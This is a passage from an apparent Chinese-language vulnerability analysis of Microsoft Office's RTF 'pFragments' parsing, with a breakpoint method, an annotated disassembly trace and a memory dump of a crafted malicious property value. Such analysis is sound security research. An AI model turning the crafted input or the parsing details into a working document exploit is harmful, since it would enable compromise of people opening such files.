style="text-align:center">Null</td></tr></tbody></table><p>&emsp;&emsp;<code>Fragments</code>是可选的，形状的附加部分。它们允许<code>形状</code>包含多个<code>路径</code>和<code>部件</code>。此属性列出<code>形状</code>的Fragments。其<code>属性值</code>是一个<code>Array</code>，默认值为<code>Null</code>。</p><p>&emsp;&emsp;<code>数组</code>的格式为由<code>分号</code>分隔的<code>数字序列</code>。 <code>第一个数字</code>表示数组中<code>每个元素的大小</code>(以字节为单位)。每个元素的字节数可以是<code>2、4或8</code>。当元素的大小为<code>8</code>时，每个元素表示为<code>一组两个数字</code>，但是根据下面的分析，<code>每组数字</code>使用的括号为<code>&quot;()&quot;</code>，而非<code>&quot;{}&quot;</code>。<code>第二个数字</code>表示数组中的<code>元素数</code>。 例如，<code>方形多边形</code>的点可以写为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;sv 8;4;&#123;0,0&#125;;&#123;100,0&#125;;&#123;100,100&#125;;&#123;0,100&#125;&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里已经说得<code>比较清楚</code>了，但是这些还不够，我们还需要通过<code>具体的程序</code>来进一步理解。我们需要找到程序中<code>处理这部分的代码</code>，仔细阅读。<code>怎么找到</code>，成为了一个新问题。</p><p><strong><code>找关键位置所用方法：</code></strong></p><blockquote><ul><li>1、前面调试时，<code>关键对象</code>的地址为<code>0x066a55e0</code>，但是每次<code>重新调试</code>，这个对象的位置都会<code>改变</code>，也<code>有可能</code>和<code>之前的调试</code>分配一样的地址。</li><li>2、在<code>Attach</code>目标程序后，对<code>0x066a55e0</code>对象的<code>前0x10字节</code>内存下<code>内存写断点</code>(0x066a55e0的<code>第一个dword</code>为<code>虚表指针</code>，<code>0x066a55ec</code>为<code>复制长度0xc8ac</code>所在对象成员变量的内存地址)。</li><li>3、再运行程序，如果已经执行到之前<code>调试奔溃时</code>代码区域的最顶层函数<code>sub_32E5955E</code>,还未断下来，则关闭调试器，重新<code>再来一遍</code>。</li><li>4、直到某一次程序对<code>关键对象</code>的地址分配到<code>0x066a55e0</code>，则会断在对<code>关键对象</code>初始化的位置，这时栈窗口会出现<code>&quot;pFragments&quot;</code>和<code>&quot;11111111acc8d9e9bdbfaf3c......&quot;</code>的字样，此时的代码就是Office处理<code>&quot;pFragments&quot;属性值</code>的代码片段。</li><li>5、然后根据<code>调用堆栈</code>，可以找到<code>当前函数地址</code>，以及当前函数的<code>调用地址</code>，及其<code>父函数</code>等等。</li></ul></blockquote><p>&emsp;&emsp;如此，我们就已经找到处理<code>&quot;pFragments&quot;属性值</code>的代码片段。对<code>“6;5;”</code>的处理代码应该就在附近，我们对找到的代码片段进行<code>详细分析</code>，本次调试记录中的<code>关键对象</code>地址为<code>0x05D755C8</code>，在<code>MSO_379</code>得到分配，画<code>“&lt;----”</code>的为关键位置，处理后的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br></pre></td><td class="code"><pre><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line">    所属模块: wwlib.dll</span><br><span class="line">    <span class="keyword">int</span> __stdcall sub_31FD724E(<span class="keyword">int</span> *a1)</span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line"><span class="symbol">.text:</span>31FD724E                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011DD20</span></span><br><span class="line"><span class="symbol">.text:</span>31FD724F                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B268</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7251                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">64h</span>                     <span class="comment">;   esp = esp-0x64 = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7254                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                          <span class="comment">;   ebx = 0x00594264</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7255                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x05D66800</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7256                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]             <span class="comment">;   esi = [ebp+8] = [0x0011B268+8] = [0x0011B270] = 0x00594264(a1) &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7259                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">esi</span>]                   <span class="comment">;   ebx = [esi] = [0x00594264] = 0x02340000 &lt;---- </span></span><br><span class="line"><span class="symbol">.text:</span>31FD725B                 <span class="keyword">and</span>     [<span class="built_in">ebp</span>+arg_0], <span class="number">0</span>               <span class="comment">;   [ebp+8]&amp;0 = 0x00594264&amp;0 = 0x0</span></span><br><span class="line"><span class="symbol">.text:</span>31FD725F                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">;   edi = 0x020B4500,ASCII "pFragments"</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7260                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebx</span>+<span class="number">8Ch</span>]               <span class="comment">;   edi = [ebx+0x8c] = [0x0234008c] = 0x05D66800</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7266                 <span class="keyword">push</span>    <span class="number">0</span>                            <span class="comment">; arg2: 0</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7268                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x05D66800(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7269                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_10], <span class="built_in">ebx</span>            <span class="comment">;   [ebp-0x10] = [0x0011B258] = 0x02340000</span></span><br><span class="line"><span class="symbol">.text:</span>31FD726C                 <span class="keyword">call</span>    sub_312C7431                 <span class="comment">;   </span></span><br><span class="line"><span class="symbol">.text:</span>31FD7271                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">edi</span>+<span class="number">556h</span>]              <span class="comment">;   edi = [edi+0x556] = [0x05D66D56] = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7277                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">761Ch</span>]             <span class="comment">;   eax = [ebx+0x761] = [0x02340761] = 0x05D7E120</span></span><br><span class="line"><span class="symbol">.text:</span>31FD727D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_64]            <span class="comment">;   ecx = ebp-0x64 = 0x0011B268-0x64 = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7280                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                          <span class="comment">; arg3: ecx = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7281                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">7670h</span>]        <span class="comment">; arg2: [ebx+0x7670] = [0x02347670] = 0x020B4500,ASCII "pFragments" &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7287                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">eax</span>            <span class="comment">;   [ebp-0x14] = [0x0011B254] = eax = 0x05D7E120</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>]                   <span class="comment">;   eax = [edi] = [0x020D0E00] = 0x329D4ED4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728C                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728D                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">edi</span>            <span class="comment">;   [ebp-0x18] = [0x0011B250] = edi = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7290                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">158h</span>]         <span class="comment">; [eax+0x158] = [0x329D4ED4+0x158] = [0x329D502C] = 0x329202C7(虚函数地址)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    *****************************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall sub_329202C7(<span class="keyword">int</span> a1, const CHAR *a2, _<span class="built_in">DWORD</span> *a3)</span><br><span class="line"></span><br><span class="line">    *****************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>329202C7                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>329202C8                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]                  <span class="comment">; arg3: [ebp+0xc] = [0x0011B1E4+0xC] = [0x0011B1F0] = 0x020B4500(a2),ASCII "pFragments"</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CD                 <span class="keyword">push</span>    <span class="number">1</span>                            <span class="comment">; arg2: 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CF                 <span class="keyword">call</span>    MSO_7788                     <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span><span class="number">32604566</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, dword_33426764          <span class="comment">; eax = [0x33426764] = 0x32600000(ImageBase)</span></span><br><span class="line"><span class="symbol">        .text:</span>3260456B                 <span class="keyword">retn</span>                                 <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>329202D4                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg1: eax = 0x32600000(ImageBase)</span></span><br><span class="line"><span class="symbol">    .text:</span>329202D5                 <span class="keyword">call</span>    MSO_763                      <span class="comment">; 对"pFragments"进行一些操作，如转化为Unicode，并在前面加上"pFragments"的ASCII形式的长度</span></span><br><span class="line"><span class="symbol">    .text:</span>329202DA                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">0FFFFh</span>                  <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202DF                 <span class="keyword">jz</span>      loc_32D8FCA5                 <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E5                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E6                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E7                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_8]             <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EA                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EB                 <span class="keyword">mov</span>     [<span class="built_in">edi</span>+<span class="number">14h</span>], <span class="built_in">eax</span>               <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EE                 <span class="keyword">call</span>    MSO_806                      <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F3                 <span class="keyword">push</span>    <span class="number">5</span>                            <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F5                 <span class="keyword">pop</span>     <span class="built_in">ecx</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F6                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span>                     <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F8                 <span class="keyword">rep</span> <span class="keyword">movsd</span>                            <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FA                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FC                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FD                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FE                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FF</span><br><span class="line"><span class="symbol">    .text:</span>329202FF loc_329202FF:                           </span><br><span class="line"><span class="symbol">    .text:</span>329202FF                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">    .text:</span><span class="number">32920300</span>                 <span class="keyword">retn</span>    <span class="number">0Ch</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31FD7296                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">; eax = 0x1</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7298                 <span class="keyword">jz</span>      loc_31FD731E    <span class="comment">;            ; 为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31FD729E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_64]            <span class="comment">; eax = [ebp-0x64] = [0x0011B268-0x64] = [0x0011B204] = 0x6</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A1                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">11h</span>        <span class="comment">;            ; eax = 0x6</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A4                 <span class="keyword">ja</span>      short loc_31FD72E6 <span class="comment">;         ; 大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A6                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">ds</span>:byte_31FD723C[<span class="built_in">eax</span>]   <span class="comment">; eax = [0x31FD723C+0x6] = [0x31FD7242] = 0x02</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72AD                 <span class="keyword">jmp</span>     <span class="built_in">ds</span>:off_31FD7210[<span class="built_in">eax</span>*<span class="number">4</span>] <span class="comment">;     ; [0x31FD7210+eax*4] = [0x31FD7218]</span></span><br><span class="line">= <span class="number">0x319C0556</span>,off_31FD7210为Switch语句跳转表</span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0556 loc_319C0556:                           </span><br><span class="line"><span class="symbol">.text:</span>319C0556                                                      <span class="comment">; jumptable 31FD72AD case 6           </span></span><br><span class="line"><span class="symbol">.text:</span>319C0556                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebx</span>+<span class="number">7674h</span>]             <span class="comment">; esi = [ebx+0x7674] = [0x02347674] = 0x023B0000 &lt;---- (pFragments属性值)</span></span><br><span class="line">    023B0000  <span class="number">36</span> 3B <span class="number">35</span> 3B <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">61</span> <span class="number">63</span> <span class="number">63</span> <span class="number">38</span>  <span class="number">6</span><span class="comment">;5;11111111acc8</span></span><br><span class="line">    023B0010  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span>  <span class="number">4161304161314161</span></span><br><span class="line">    023B0020  <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3241613341613441</span></span><br><span class="line">    023B0030  <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">35</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">37</span>  <span class="number">6135416136416137</span></span><br><span class="line">    023B0040  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span>  <span class="number">4161384161394162</span></span><br><span class="line">    023B0050  <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3041623141623241</span></span><br><span class="line">    023B0060  <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">35</span>  <span class="number">6233416234416235</span></span><br><span class="line">    023B0070  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span>  <span class="number">4162364162374162</span></span><br><span class="line">    023B0080  <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3841623941633041</span></span><br><span class="line">    023B0090  <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">6331416332416333</span></span><br><span class="line">    023B00A0  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">35</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span>  <span class="number">4163344163354163</span></span><br><span class="line">    023B00B0  <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3641633741633841</span></span><br><span class="line"><span class="symbol">.text:</span>319C055C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x023B0000(pFragments属性值)</span></span><br><span class="line"><span class="symbol">.text:</span>319C055E loc_319C055E:                           </span><br><span class="line"><span class="symbol">.text:</span>319C055E                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">3Bh</span>          <span class="comment">;   [esi] = [0x023B0000] = 0x36 ('6'),3B=';' &lt;---- 截取参数</span></span><br><span class="line"><span class="symbol">.text:</span>319C0561                 <span class="keyword">jz</span>      loc_315E7ED1                 <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>319C0567                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0001</span></span><br><span class="line"><span class="symbol">.text:</span>319C0568                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0001] = 0x3B(';') &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>319C056B                 <span class="keyword">jnz</span>     short loc_319C055E           <span class="comment">;   不为0跳转，这里跳转</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">315E7ED1    C606 <span class="number">00</span>            <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="number">0x0</span>            <span class="comment">;   [esi] = [0x023B0001] = 0x0</span></span><br><span class="line">315E7ED4    <span class="number">46</span>                 <span class="keyword">inc</span> <span class="built_in">esi</span>                              <span class="comment">;   esi = esi+1 = 0x023B0002</span></span><br><span class="line">315E7ED5    E9 93863D00        <span class="keyword">jmp</span> wwlib.319C056D                   <span class="comment">;</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C056D loc_319C056D:                           </span><br><span class="line"><span class="symbol">.text:</span>319C056D                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg1: eax = 0x023B0000(pFragments属性值)</span></span><br><span class="line"><span class="symbol">.text:</span>319C056E                 <span class="keyword">call</span>    sub_31BAF3C6                 <span class="comment">; 判断pFragments的属性数组参数是否合法，合法则由字符转为整型</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ******************************************</span><br><span class="line"></span><br><span class="line">        所属模块: wwlib.dll</span><br><span class="line">        <span class="keyword">int</span> __stdcall sub_31BAF3C6(<span 